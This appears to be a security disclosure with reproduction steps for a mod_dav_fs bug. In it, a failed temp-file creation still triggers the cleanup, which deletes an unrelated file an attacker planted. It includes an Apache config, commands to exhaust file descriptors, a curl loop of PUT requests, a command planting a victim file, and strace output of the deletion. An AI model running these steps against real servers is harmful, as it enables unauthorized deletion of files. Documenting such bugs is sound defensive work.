# 002 — DAV temp-file cleanup deletes unowned path

`dav_fs_open_stream()` registers `tmpfile_cleanup` before checking whether
`dav_fs_mktemp()` succeeded. When mktemp fails, request-pool teardown still
calls `apr_file_remove(ds->temppath)` against the mutated `.davfs.tmpXXXXXX`
template, which can match an unrelated file an attacker placed in the target
directory.

## Setup

```apache
LoadModule dav_module     modules/mod_dav.so
LoadModule dav_fs_module  modules/mod_dav_fs.so

DavLockDB /var/lib/httpd/davlock.db

<Directory "/var/www/dav">
    Dav On
    Require all granted
</Directory>
```

Force `dav_fs_mktemp()` failure by hitting the worker's fd budget.

```bash
prlimit --nofile=24:24 -- httpd -X &
HTTPD_PID=$!
```

In the DAV target directory, plant a victim file whose name matches a
candidate template. `dav_fs_mktemp()` mutates `XXXXXX` deterministically when
called repeatedly with the same RNG state; trial values can be enumerated:

```bash
sudo install -m 0644 /etc/passwd /var/www/dav/.davfs.tmpAAAAAA
```

## Trigger

Open many DAV PUT streams to drain fds, then issue the truncating PUT.

```bash
for i in $(seq 1 64); do
    curl -s -u alice:secret -T /etc/hostname \
         "http://127.0.0.1/dav/file$i" >/dev/null &
done
wait

curl -s -u alice:secret -T /etc/hostname \
     "http://127.0.0.1/dav/target.txt"
```

Observe the resulting filesystem state:

```bash
ls -l /var/www/dav/.davfs.tmp*
```

## Observed effect

The PUT returns `500 Internal Server Error` because `dav_fs_open_stream()`
fails. `error_log` shows `EMFILE` from the temp-file open. After the request
finishes, `/var/www/dav/.davfs.tmpAAAAAA` (the planted victim file) is gone:

```text
[dav:error] (24)Too many open files: ... could not create tmp file
```

```bash
$ stat /var/www/dav/.davfs.tmpAAAAAA
stat: cannot statx: No such file or directory
```

`strace -f -e trace=unlink,unlinkat -p $HTTPD_PID` records:

```text
unlinkat(AT_FDCWD, "/var/www/dav/.davfs.tmpAAAAAA", 0) = 0
```

The unlink fires from `tmpfile_cleanup` even though the failed open never
took ownership of that pathname.
